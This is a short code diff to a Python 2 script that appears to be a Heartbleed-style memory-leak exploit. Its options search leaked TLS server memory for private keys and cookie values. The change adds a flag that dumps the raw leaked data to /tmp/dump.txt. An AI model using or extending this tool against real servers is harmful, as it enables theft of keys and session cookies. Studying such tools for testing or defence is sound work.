@@ -17,7 +17,7 @@ def usage():
     print "      -c  --  Attempt to find any cookie values in mem, paramter should be HTTP header ex: -c 'Cookie:'"
 
 try:
-    opts, args = getopt.getopt(sys.argv[1:], "hd:n:c:p")
+    opts, args = getopt.getopt(sys.argv[1:], "hd:n:c:pr")
 except getopt.GetoptError as err:
     print str(err)
     usage()
@@ -28,6 +28,7 @@ address = "127.0.0.1:443"
 find_priv_key = False
 cookie_val = "Cookie:"
 find_cookie = False
+find_base = False
 
 for o, a in opts:
     if o == "-d":
@@ -42,6 +43,8 @@ for o, a in opts:
         sys.exit()
     elif o == "-p":
         find_priv_key = True
+    elif o == "-r":
+        find_base = True 
     elif o == "-c":
         find_cookie = True
         cookie_val = a
@@ -115,6 +118,12 @@ for x in range(0, numb):
         pass
 
     resp = resp + connection.readPOC(0xffff)
+
+if find_base:
+    fd = open("/tmp/dump.txt", "w")
+    fd.write(resp)
+    fd.close()
+
 
 if find_priv_key:
     resp = bytearray(resp)
